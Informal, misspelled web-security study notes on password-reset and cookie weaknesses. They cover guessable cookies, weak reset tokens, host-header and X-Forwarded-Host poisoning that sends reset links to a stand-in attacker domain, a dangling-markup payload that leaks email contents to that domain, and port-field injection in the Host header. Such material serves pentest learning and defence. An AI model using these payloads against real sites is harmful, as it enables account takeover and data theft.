changing password, reseting passwords

the persistent cookies should not have easyly guessed patter which a attaacker can decode and make new one to brute force his way finding valid cookies

eniretly random long strings can be used in this case 

reset password url token should be strong and random with reference to the respective user in server side

same token shouldlnt let reset other users password

dynamically generated reset links based on the host feild in the request can be captured and pointed to attacker server by manipulation the host header or by placing x-forwarded-host header to make the bankend send the link with attacker server as the host and rest token 

change host to : http://evil.ai
the link will be generated as http://evil.ai/password?token=123

thus now if the user clicks the link, the link will be captured in the attacker's log, thus token is stolen
now the attacker can make a legit password reset request with that token.

if html could be injected via host or any other, we can user dangling pointer techique to get data out of the mail

"><img src='http://evil.ai?=
as the url is left dangling everthing after the will be sent with url, thus lets us steal valuable information.

look if the host accepts port as alpha numeric that can used as injection point 

Host : ligit.server:'evil-payload

changing user passwords

change password page can be used to enumurate users and also brute force valid passwords based on responses
